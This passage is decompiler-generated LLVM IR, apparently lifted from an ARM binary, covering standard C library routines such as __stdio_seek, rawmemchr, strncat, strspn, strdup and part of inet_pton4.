  %v2_11480 = load i32, i32* %v1_11480, align 4
  store i32 %v2_11480, i32* %r3.global-to-local, align 4
  %v1_11484 = add i32 %v0_11480, 8
  %v2_11484 = inttoptr i32 %v1_11484 to i32*
  %v3_11484 = load i32, i32* %v2_11484, align 4
  store i32 %v3_11484, i32* %r2.global-to-local, align 4
  %v1_11488 = and i32 %v2_11480, -65
  store i32 %v1_11488, i32* %r3.global-to-local, align 4
  %v3_1148c = sdiv i32 %v2_11480, 256
  store i32 %v3_1148c, i32* %r1.global-to-local, align 4
  %v2_11490 = add i32 %v0_11480, 28
  %v3_11490 = inttoptr i32 %v2_11490 to i32*
  store i32 %v3_11484, i32* %v3_11490, align 4
  %v0_11494 = load i32, i32* %r1.global-to-local, align 4
  %v1_11494 = trunc i32 %v0_11494 to i8
  %v2_11494 = load i32, i32* @r4, align 4
  %v3_11494 = add i32 %v2_11494, 1
  %v4_11494 = inttoptr i32 %v3_11494 to i8*
  store i8 %v1_11494, i8* %v4_11494, align 1
  %v0_11498 = load i32, i32* %r3.global-to-local, align 4
  %v1_11498 = trunc i32 %v0_11498 to i8
  %v2_11498 = load i32, i32* @r4, align 4
  %v3_11498 = inttoptr i32 %v2_11498 to i8*
  store i8 %v1_11498, i8* %v3_11498, align 1
  %v0_1149c.pre = load i32, i32* @r4, align 4
  %v0_114a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1149c

dec_label_pc_1149c:                               ; preds = %dec_label_pc_1146c, %dec_label_pc_11480
  %v0_114a8 = phi i32 [ 0, %dec_label_pc_1146c ], [ %v0_114a8.pre, %dec_label_pc_11480 ]
  %v2_114ac = phi i32 [ %v0_11430, %dec_label_pc_1146c ], [ %v0_1149c.pre, %dec_label_pc_11480 ]
  %v1_1149c = inttoptr i32 %v2_114ac to i32*
  %v2_1149c = load i32, i32* %v1_1149c, align 4
  %v1_114a0 = or i32 %v2_1149c, 1
  store i32 %v1_114a0, i32* %r3.global-to-local, align 4
  %v3_114a4 = sdiv i32 %v2_1149c, 256
  store i32 %v3_114a4, i32* %r2.global-to-local, align 4
  %v1_114ac = trunc i32 %v3_114a4 to i8
  %v3_114ac = add i32 %v2_114ac, 1
  %v4_114ac = inttoptr i32 %v3_114ac to i8*
  store i8 %v1_114ac, i8* %v4_114ac, align 1
  %v0_114b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_114b0 = trunc i32 %v0_114b0 to i8
  %v2_114b0 = load i32, i32* @r4, align 4
  %v3_114b0 = inttoptr i32 %v2_114b0 to i8*
  store i8 %v1_114b0, i8* %v3_114b0, align 1
  %v2_114b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_114b4, i32* @r4, align 4
  ret i32 %v0_114a8

; uselistorder directives
  uselistorder i32 %v3_114a4, { 1, 0 }
  uselistorder i32 %v3_11458, { 1, 0 }
  uselistorder i32 %v3_11430, { 1, 2, 0, 3 }
  uselistorder i32 %v0_11430, { 0, 2, 1 }
  uselistorder i32 %v3_11424, { 1, 0 }
  uselistorder i32 %v5_11408, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 3, 1, 0, 4, 2 }
  uselistorder label %dec_label_pc_1149c, { 1, 0 }
  uselistorder label %dec_label_pc_11444, { 1, 0 }
  uselistorder label %dec_label_pc_11430, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_114bc = load i32, i32* @r4, align 4
  %v6_114bc = load i32, i32* @lr, align 4
  %v1_114c0 = add i32 %arg1, 4
  %v2_114c0 = inttoptr i32 %v1_114c0 to i32*
  %v3_114c0 = load i32, i32* %v2_114c0, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_114c8 = load i32, i32* %arg2, align 4
  %v3_114c8 = add i32 %tmp, 4
  %v4_114c8 = inttoptr i32 %v3_114c8 to i32*
  %v5_114c8 = load i32, i32* %v4_114c8, align 4
  %v6_114cc = call i32 @__libc_lseek64(i32 %v3_114c0, i32 %v2_114c8, i32 %v5_114c8, i32 %arg3, i32 %v3_114bc, i32 %v6_114bc)
  %v1_114d0 = icmp slt i32 %v2_114c8, 0
  %v6_114cc. = select i1 %v1_114d0, i32 %v6_114cc, i32 0
  store i32 %v6_114cc., i32* %r3.global-to-local, align 4
  br i1 %v1_114d0, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_114dc = load i32, i32* @r4, align 4
  %v4_114dc = inttoptr i32 %v3_114dc to i32*
  store i32 %v6_114cc, i32* %v4_114dc, align 4
  %v6_114dc = add i32 %v3_114dc, 4
  %v7_114dc = inttoptr i32 %v6_114dc to i32*
  store i32 %v2_114c8, i32* %v7_114dc, align 4
  %v0_114e0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_114e0 = phi i32 [ %v6_114cc, %entry ], [ %v0_114e0.pre, %bb ]
  ret i32 %v0_114e0

; uselistorder directives
  uselistorder i32 %v6_114cc, { 0, 2, 1 }
  uselistorder i32 %v2_114c8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1150c:
  %v1_114ec = urem i32 %arg1, 256
  store i32 %v1_114ec, i32* @lr, align 4
  %v4_1150c = mul nuw nsw i32 %v1_114ec, 256
  %v5_1150c = or i32 %v4_1150c, %v1_114ec
  %v4_11514 = mul i32 %v5_1150c, 65536
  %v5_11514 = or i32 %v4_11514, %v5_1150c
  %v0_11518.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_11518

dec_label_pc_11518:                               ; preds = %dec_label_pc_11584, %dec_label_pc_11518, %dec_label_pc_1150c
  %v0_11518 = phi i32 [ %v0_11518.pre, %dec_label_pc_1150c ], [ %v4_11518, %dec_label_pc_11518 ], [ %v4_11518, %dec_label_pc_11584 ]
  %v1_11518 = inttoptr i32 %v0_11518 to i32*
  %v2_11518 = load i32, i32* %v1_11518, align 4
  %v4_11518 = add i32 %v0_11518, 4
  store i32 %v4_11518, i32* @ip, align 4
  %v2_11520 = xor i32 %v2_11518, %v5_11514
  %v2_11524 = add i32 %v2_11520, 2130640639
  %v1_1152c = sub i32 -1, %v2_11520
  %v2_11530 = xor i32 %v2_11524, %v1_1152c
  %v2_11534 = and i32 %v2_11530, -2130640640
  %v2_11538 = icmp eq i32 %v2_11534, 0
  br i1 %v2_11538, label %dec_label_pc_11518, label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_11518
  %v2_11540 = inttoptr i32 %v0_11518 to i8*
  %v3_11540 = load i8, i8* %v2_11540, align 1
  %v4_11540 = zext i8 %v3_11540 to i32
  %v9_11548 = icmp eq i32 %v4_11540, %v1_114ec
  store i1 %v9_11548, i1* @cpsr_z, align 1
  %v1_1154c = add i32 %v0_11518, 3
  %v1_11550 = add i32 %v0_11518, 1
  store i32 %v1_11550, i32* @r2, align 4
  %v1_11554 = add i32 %v0_11518, 2
  br i1 %v9_11548, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_11540
  ret i32 %v0_11518

bb18:                                             ; preds = %dec_label_pc_11540
  %v2_1155c = inttoptr i32 %v1_11550 to i8*
  %v3_1155c = load i8, i8* %v2_1155c, align 1
  %v4_1155c = zext i8 %v3_1155c to i32
  %v9_11560 = icmp eq i32 %v4_1155c, %v1_114ec
  store i1 %v9_11560, i1* @cpsr_z, align 1
  br i1 %v9_11560, label %dec_label_pc_11568, label %dec_label_pc_11570

dec_label_pc_11568:                               ; preds = %bb18
  ret i32 %v1_11550

dec_label_pc_11570:                               ; preds = %bb18
  %v2_11570 = inttoptr i32 %v1_11554 to i8*
  %v3_11570 = load i8, i8* %v2_11570, align 1
  %v4_11570 = zext i8 %v3_11570 to i32
  %v9_11574 = icmp eq i32 %v4_11570, %v1_114ec
  store i1 %v9_11574, i1* @cpsr_z, align 1
  br i1 %v9_11574, label %dec_label_pc_1157c, label %dec_label_pc_11584

dec_label_pc_1157c:                               ; preds = %dec_label_pc_11570
  ret i32 %v1_11554

dec_label_pc_11584:                               ; preds = %dec_label_pc_11570
  %v2_11584 = inttoptr i32 %v1_1154c to i8*
  %v3_11584 = load i8, i8* %v2_11584, align 1
  %v4_11584 = zext i8 %v3_11584 to i32
  %v9_11588 = icmp eq i32 %v4_11584, %v1_114ec
  store i1 %v9_11588, i1* @cpsr_z, align 1
  br i1 %v9_11588, label %dec_label_pc_11590, label %dec_label_pc_11518

dec_label_pc_11590:                               ; preds = %dec_label_pc_11584
  ret i32 %v1_1154c

; uselistorder directives
  uselistorder i32 %v4_11518, { 2, 1, 0 }
  uselistorder i32 %v0_11518, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1150c, { 1, 0 }
  uselistorder i32 %v1_114ec, { 2, 3, 4, 5, 6, 0, 1 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_115a0 = load i32, i32* @r4, align 4
  store i32 %v3_115a0, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_115ac

dec_label_pc_115ac:                               ; preds = %dec_label_pc_115ac, %entry
  %v0_115ac = phi i32 [ %v5_115ac, %dec_label_pc_115ac ], [ %tmp, %entry ]
  %v1_115ac = inttoptr i32 %v0_115ac to i8*
  %v2_115ac = load i8, i8* %v1_115ac, align 1
  %v3_115ac = zext i8 %v2_115ac to i32
  store i32 %v3_115ac, i32* %ip.global-to-local, align 4
  %v5_115ac = add i32 %v0_115ac, 1
  store i32 %v5_115ac, i32* %r3.global-to-local, align 4
  %v2_115b0 = icmp eq i8 %v2_115ac, 0
  store i1 %v2_115b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115b0, label %dec_label_pc_115b8, label %dec_label_pc_115ac

dec_label_pc_115b8:                               ; preds = %dec_label_pc_115ac
  %v0_115b8 = load i32, i32* %r2.global-to-local, align 4
  %v7_115b8 = icmp eq i32 %v0_115b8, 3
  store i1 %v7_115b8, i1* %cpsr_z.global-to-local, align 1
  %v1_115bc = add i32 %v0_115ac, -1
  store i32 %v1_115bc, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_115b8, 4
  br i1 %tmp10, label %dec_label_pc_11650thread-pre-split, label %dec_label_pc_115c4

dec_label_pc_115c4:                               ; preds = %dec_label_pc_115b8
  %v3_115c4 = udiv i32 %v0_115b8, 4
  store i32 %v3_115c4, i32* %r0.global-to-local, align 4
  %v0_115c8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_115c8

dec_label_pc_115c8:                               ; preds = %dec_label_pc_11628, %dec_label_pc_115c4
  %v2_115d0 = phi i32 [ %v1_11620, %dec_label_pc_11628 ], [ %v1_115bc, %dec_label_pc_115c4 ]
  %v0_115c8 = phi i32 [ %v1_1161c, %dec_label_pc_11628 ], [ %v0_115c8.pre, %dec_label_pc_115c4 ]
  %v1_115c8 = inttoptr i32 %v0_115c8 to i8*
  %v2_115c8 = load i8, i8* %v1_115c8, align 1
  %v3_115c8 = zext i8 %v2_115c8 to i32
  store i32 %v3_115c8, i32* %r3.global-to-local, align 4
  %v2_115cc = icmp eq i8 %v2_115c8, 0
  store i1 %v2_115cc, i1* %cpsr_z.global-to-local, align 1
  %v3_115d0 = add i32 %v2_115d0, 1
  %v4_115d0 = inttoptr i32 %v3_115d0 to i8*
  store i8 %v2_115c8, i8* %v4_115d0, align 1
  %v0_115d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_115d4 = add i32 %v0_115d4, 1
  store i32 %v1_115d4, i32* %ip.global-to-local, align 4
  %v0_115d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_115d8, label %.loopexit, label %dec_label_pc_115dc

dec_label_pc_115dc:                               ; preds = %dec_label_pc_115c8
  %v0_115dc = load i32, i32* @r1, align 4
  %v1_115dc = add i32 %v0_115dc, 1
  %v2_115dc = inttoptr i32 %v1_115dc to i8*
  %v3_115dc = load i8, i8* %v2_115dc, align 1
  %v4_115dc = zext i8 %v3_115dc to i32
  store i32 %v4_115dc, i32* %r3.global-to-local, align 4
  %v2_115e0 = icmp eq i8 %v3_115dc, 0
  store i1 %v2_115e0, i1* %cpsr_z.global-to-local, align 1
  %v3_115e4 = add i32 %v0_115d4, 2
  %v4_115e4 = inttoptr i32 %v3_115e4 to i8*
  store i8 %v3_115dc, i8* %v4_115e4, align 1
  %v0_115e8 = load i32, i32* @r1, align 4
  %v1_115e8 = add i32 %v0_115e8, 1
  store i32 %v1_115e8, i32* %r1.global-to-local, align 4
  %v0_115ec = load i32, i32* %ip.global-to-local, align 4
  %v1_115ec = add i32 %v0_115ec, 1
  store i32 %v1_115ec, i32* %ip.global-to-local, align 4
  %v0_115f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_115f0, label %.loopexit, label %dec_label_pc_115f4

dec_label_pc_115f4:                               ; preds = %dec_label_pc_115dc
  %v1_115f4 = add i32 %v0_115e8, 2
  %v2_115f4 = inttoptr i32 %v1_115f4 to i8*
  %v3_115f4 = load i8, i8* %v2_115f4, align 1
  %v4_115f4 = zext i8 %v3_115f4 to i32
  store i32 %v4_115f4, i32* %r3.global-to-local, align 4
  %v2_115f8 = icmp eq i8 %v3_115f4, 0
  store i1 %v2_115f8, i1* %cpsr_z.global-to-local, align 1
  %v3_115fc = add i32 %v0_115ec, 2
  %v4_115fc = inttoptr i32 %v3_115fc to i8*
  store i8 %v3_115f4, i8* %v4_115fc, align 1
  %v0_11600 = load i32, i32* %r1.global-to-local, align 4
  %v1_11600 = add i32 %v0_11600, 1
  store i32 %v1_11600, i32* %r1.global-to-local, align 4
  %v0_11604 = load i32, i32* %ip.global-to-local, align 4
  %v1_11604 = add i32 %v0_11604, 1
  store i32 %v1_11604, i32* %lr.global-to-local, align 4
  %v0_11608 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11608, label %.loopexit, label %dec_label_pc_1160c

dec_label_pc_1160c:                               ; preds = %dec_label_pc_115f4
  %v1_1160c = add i32 %v0_11600, 2
  %v2_1160c = inttoptr i32 %v1_1160c to i8*
  %v3_1160c = load i8, i8* %v2_1160c, align 1
  %v4_1160c = zext i8 %v3_1160c to i32
  store i32 %v4_1160c, i32* %ip.global-to-local, align 4
  store i32 %v1_1160c, i32* %r3.global-to-local, align 4
  %v2_11614 = icmp eq i8 %v3_1160c, 0
  store i1 %v2_11614, i1* %cpsr_z.global-to-local, align 1
  %v3_11618 = add i32 %v0_11604, 2
  %v4_11618 = inttoptr i32 %v3_11618 to i8*
  store i8 %v3_1160c, i8* %v4_11618, align 1
  %v0_1161c = load i32, i32* %r3.global-to-local, align 4
  %v1_1161c = add i32 %v0_1161c, 1
  store i32 %v1_1161c, i32* @r1, align 4
  %v0_11620 = load i32, i32* %lr.global-to-local, align 4
  %v1_11620 = add i32 %v0_11620, 1
  store i32 %v1_11620, i32* %lr.global-to-local, align 4
  %v0_11624 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11624, label %.loopexit, label %dec_label_pc_11628

dec_label_pc_11628:                               ; preds = %dec_label_pc_1160c
  %v0_11628 = load i32, i32* %r0.global-to-local, align 4
  %v1_11628 = add i32 %v0_11628, -1
  store i32 %v1_11628, i32* %r0.global-to-local, align 4
  %v7_11628 = icmp eq i32 %v0_11628, 1
  store i1 %v7_11628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11628, label %dec_label_pc_11630, label %dec_label_pc_115c8

dec_label_pc_11630:                               ; preds = %dec_label_pc_11628
  %v0_11630 = load i32, i32* %r2.global-to-local, align 4
  %v1_11630 = urem i32 %v0_11630, 4
  store i32 %v1_11630, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11650

dec_label_pc_11638:                               ; preds = %dec_label_pc_11650
  %v0_11638 = load i32, i32* @r1, align 4
  %v1_11638 = inttoptr i32 %v0_11638 to i8*
  %v2_11638 = load i8, i8* %v1_11638, align 1
  %v3_11638 = zext i8 %v2_11638 to i32
  store i32 %v3_11638, i32* %ip.global-to-local, align 4
  %v2_1163c = icmp eq i8 %v2_11638, 0
  store i1 %v2_1163c, i1* %cpsr_z.global-to-local, align 1
  %v1_11640 = add i32 %v1_1165c, -1
  store i32 %v1_11640, i32* %r2.global-to-local, align 4
  %v3_11644 = add i32 %v3_1165c, 1
  %v4_11644 = inttoptr i32 %v3_11644 to i8*
  store i8 %v2_11638, i8* %v4_11644, align 1
  %v5_11644 = load i32, i32* %lr.global-to-local, align 4
  %v6_11644 = add i32 %v5_11644, 1
  store i32 %v6_11644, i32* %lr.global-to-local, align 4
  %v0_11648 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11648, label %.loopexit, label %dec_label_pc_1164c

dec_label_pc_1164c:                               ; preds = %dec_label_pc_11638
  %v0_1164c = load i32, i32* @r1, align 4
  %v1_1164c = add i32 %v0_1164c, 1
  store i32 %v1_1164c, i32* @r1, align 4
  %v0_11650.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11650thread-pre-split

dec_label_pc_11650thread-pre-split:               ; preds = %dec_label_pc_1164c, %dec_label_pc_115b8
  %v2_116446 = phi i32 [ %v6_11644, %dec_label_pc_1164c ], [ %v1_115bc, %dec_label_pc_115b8 ]
  %v0_11650.pr = phi i32 [ %v0_11650.pr.pre, %dec_label_pc_1164c ], [ %v0_115b8, %dec_label_pc_115b8 ]
  br label %dec_label_pc_11650

dec_label_pc_11650:                               ; preds = %dec_label_pc_11650thread-pre-split, %dec_label_pc_11630
  %v3_1165c = phi i32 [ %v2_116446, %dec_label_pc_11650thread-pre-split ], [ %v1_11620, %dec_label_pc_11630 ]
  %v1_1165c = phi i32 [ %v0_11650.pr, %dec_label_pc_11650thread-pre-split ], [ %v1_11630, %dec_label_pc_11630 ]
  %v2_11650 = icmp eq i32 %v1_1165c, 0
  store i1 %v2_11650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11650, label %dec_label_pc_11658, label %dec_label_pc_11638

dec_label_pc_11658:                               ; preds = %dec_label_pc_11650
  %v0_11658 = load i32, i32* %ip.global-to-local, align 4
  %v2_11658 = icmp eq i32 %v0_11658, 0
  store i1 %v2_11658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11658, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_11658
  %v4_1165c = add i32 %v3_1165c, 1
  %v5_1165c = inttoptr i32 %v4_1165c to i8*
  store i8 0, i8* %v5_1165c, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1160c, %dec_label_pc_115f4, %dec_label_pc_115dc, %dec_label_pc_115c8, %dec_label_pc_11638, %dec_label_pc_11658, %bb
  %v0_11660 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11660, i32* %r0.global-to-local, align 4
  %v2_11664 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11664, i32* @r4, align 4
  ret i32 %v0_11660

; uselistorder directives
  uselistorder i32 %v1_1165c, { 1, 0 }
  uselistorder i32 %v1_11630, { 1, 0 }
  uselistorder i32 %v0_11628, { 1, 0 }
  uselistorder i32 %v1_11620, { 0, 2, 1 }
  uselistorder i32 %v1_1161c, { 1, 0 }
  uselistorder i32 %v0_115b8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_115ac, { 1, 0 }
  uselistorder i32 %v0_115ac, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_116a02 = load i32, i32* @r0, align 4
  %v1_116a03 = inttoptr i32 %v0_116a02 to i8*
  %v2_116a04 = load i8, i8* %v1_116a03, align 1
  %v3_116a05 = zext i8 %v2_116a04 to i32
  store i32 %v3_116a05, i32* @r2, align 4
  %v2_116a46 = icmp eq i8 %v2_116a04, 0
  br i1 %v2_116a46, label %dec_label_pc_116b0, label %dec_label_pc_1167c.preheader

dec_label_pc_11674:                               ; preds = %dec_label_pc_1167c
  %v1_11684 = add i32 %v0_11684, 1
  %v9_11674 = icmp eq i32 %v0_11690, %v3_1167c
  br i1 %v9_11674, label %dec_label_pc_11690, label %dec_label_pc_1167c

dec_label_pc_1167c:                               ; preds = %dec_label_pc_1167c.preheader, %dec_label_pc_11674
  %v0_11684 = phi i32 [ %tmp, %dec_label_pc_1167c.preheader ], [ %v1_11684, %dec_label_pc_11674 ]
  %v1_1167c = inttoptr i32 %v0_11684 to i8*
  %v2_1167c = load i8, i8* %v1_1167c, align 1
  %v3_1167c = zext i8 %v2_1167c to i32
  store i32 %v3_1167c, i32* @ip, align 4
  %v2_11680 = icmp eq i8 %v2_1167c, 0
  br i1 %v2_11680, label %dec_label_pc_116b0, label %dec_label_pc_11674

dec_label_pc_11690:                               ; preds = %dec_label_pc_11674
  %v2_11690 = icmp eq i32 %v0_11690, 0
  br i1 %v2_11690, label %dec_label_pc_116b0, label %dec_label_pc_11698

dec_label_pc_11698:                               ; preds = %dec_label_pc_11690
  %v1_11698 = add i32 %v0_11698, 1
  store i32 %v1_11698, i32* @lr, align 4
  %v1_1169c = add i32 %v0_1169c, 1
  %v1_116a0 = inttoptr i32 %v1_1169c to i8*
  %v2_116a0 = load i8, i8* %v1_116a0, align 1
  %v3_116a0 = zext i8 %v2_116a0 to i32
  store i32 %v3_116a0, i32* @r2, align 4
  %v2_116a4 = icmp eq i8 %v2_116a0, 0
  br i1 %v2_116a4, label %dec_label_pc_116b0, label %dec_label_pc_1167c.preheader

dec_label_pc_1167c.preheader:                     ; preds = %entry, %dec_label_pc_11698
  %v0_1169c = phi i32 [ %v1_1169c, %dec_label_pc_11698 ], [ %v0_116a02, %entry ]
  %v0_11698 = phi i32 [ %v1_11698, %dec_label_pc_11698 ], [ 0, %entry ]
  %v0_11690 = phi i32 [ %v3_116a0, %dec_label_pc_11698 ], [ %v3_116a05, %entry ]
  br label %dec_label_pc_1167c

dec_label_pc_116b0:                               ; preds = %dec_label_pc_11690, %dec_label_pc_11698, %dec_label_pc_1167c, %entry
  %v0_116b0 = phi i32 [ 0, %entry ], [ %v0_11698, %dec_label_pc_1167c ], [ %v1_11698, %dec_label_pc_11698 ], [ %v0_11698, %dec_label_pc_11690 ]
  ret i32 %v0_116b0

; uselistorder directives
  uselistorder i32 %v3_1167c, { 1, 0 }
  uselistorder i32 %v0_11684, { 1, 0 }
  uselistorder label %dec_label_pc_116b0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1167c.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_116b8 = load i32, i32* @r4, align 4
  store i32 %v3_116b8, i32* %stack_var_-12, align 4
  %v6_116b8 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_116c0 = call i32 @strlen(i8* %arg1)
  %v1_116c4 = add i32 %v3_116c0, 1
  store i32 %v1_116c4, i32* @r4, align 4
  %v1_116cc = call i32 @malloc(i32 %v1_116c4)
  store i32 71392, i32* @lr, align 4
  %v1_116dc = icmp ne i32 %v1_116cc, 0
  call void @__pseudo_cond_branch(i1 %v1_116dc, i32 ptrtoint (i32* @global_var_c850.644 to i32))
  %v2_116e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_116e4, i32* @r4, align 4
  store i32 %v6_116b8, i32* @r5, align 4
  ret i32 %v1_116cc

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 4, 1, 0, 11, 12, 3, 2, 10, 9, 8, 7, 6, 5 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_116e8 = load i32, i32* @r5, align 4
  %v2_116f0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_116f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_117783 = load i8, i8* %arg1, align 1
  %v3_117784 = zext i8 %v2_117783 to i32
  %v5_117785 = add i32 %tmp, 1
  store i32 %v5_117785, i32* @r4, align 4
  %v2_1177c6 = icmp eq i8 %v2_117783, 0
  store i1 %v2_1177c6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1177c6, label %dec_label_pc_11788, label %dec_label_pc_11710

dec_label_pc_11710:                               ; preds = %entry, %dec_label_pc_11778.backedge
  %v0_11754 = phi i32 [ %v3_11778, %dec_label_pc_11778.backedge ], [ %v3_117784, %entry ]
  %v1_1178010.in = phi i32 [ %v3_11778, %dec_label_pc_11778.backedge ], [ %v3_117784, %entry ]
  %v1_1178010 = add nsw i32 %v1_1178010.in, -48
  %v2_11710 = icmp ugt i32 %v1_1178010, 8
  %v7_11710 = icmp eq i32 %v1_1178010, 9
  store i1 %v7_11710, i1* %cpsr_z.global-to-local, align 1
  %v2_11718 = xor i1 %v7_11710, true
  %v3_11718 = and i1 %v2_11710, %v2_11718
  br i1 %v3_11718, label %dec_label_pc_11754, label %dec_label_pc_1171c

dec_label_pc_1171c:                               ; preds = %dec_label_pc_11710
  %v0_1171c = load i32, i32* %r0.global-to-local, align 4
  %v1_1171c = inttoptr i32 %v0_1171c to i8*
  %v2_1171c = load i8, i8* %v1_1171c, align 1
  %v3_1171c = zext i8 %v2_1171c to i32
  %v3_11724 = mul nuw nsw i32 %v3_1171c, 10
  %v4_11724 = add nuw nsw i32 %v3_11724, %v0_11754
  %v1_11728 = add nsw i32 %v4_11724, -48
  %v2_1172c = icmp ugt i32 %v1_11728, 254
  %v7_1172c = icmp eq i32 %v1_11728, 255
  store i1 %v7_1172c, i1* %cpsr_z.global-to-local, align 1
  %v2_11730 = xor i1 %v7_1172c, true
  %v3_11730 = and i1 %v2_1172c, %v2_11730
  br i1 %v3_11730, label %dec_label_pc_117ac, label %dec_label_pc_11734

dec_label_pc_11734:                               ; preds = %dec_label_pc_1171c
  %v0_11734 = load i32, i32* %r1.global-to-local, align 4
  %v2_11734 = icmp eq i32 %v0_11734, 0
  store i1 %v2_11734, i1* %cpsr_z.global-to-local, align 1
  %v1_11738 = trunc i32 %v1_11728 to i8
  store i8 %v1_11738, i8* %v1_1171c, align 1
  %v0_1173c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1173c, label %dec_label_pc_11740, label %dec_label_pc_11778.backedge

dec_label_pc_11740:                               ; preds = %dec_label_pc_11734
  %v0_11740 = load i32, i32* @lr, align 4
  %v1_11740 = add i32 %v0_11740, 1
  store i32 %v1_11740, i32* @lr, align 4
  %v7_11744 = icmp eq i32 %v1_11740, 4
  store i1 %v7_11744, i1* %cpsr_z.global-to-local, align 1
  %v0_11748 = load i32, i32* %r1.global-to-local, align 4
  %v1_11748 = add i32 %v0_11748, 1
  store i32 %v1_11748, i32* %r1.global-to-local, align 4
  %v8_1174c = icmp sgt i32 %v1_11740, 4
  br i1 %v8_1174c, label %dec_label_pc_117ac, label %dec_label_pc_11778.backedge

dec_label_pc_11754:                               ; preds = %dec_label_pc_11710
  %v7_11754 = icmp eq i32 %v0_11754, 46
  store i1 %v7_11754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11754, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_11754
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_117ac

bb:                                               ; preds = %dec_label_pc_11754
  %v1_1175c = load i32, i32* %r1.global-to-local, align 4
  %v2_1175c = urem i32 %v1_1175c, 2
  %v2_11760 = icmp eq i32 %v2_1175c, 0
  store i1 %v2_11760, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
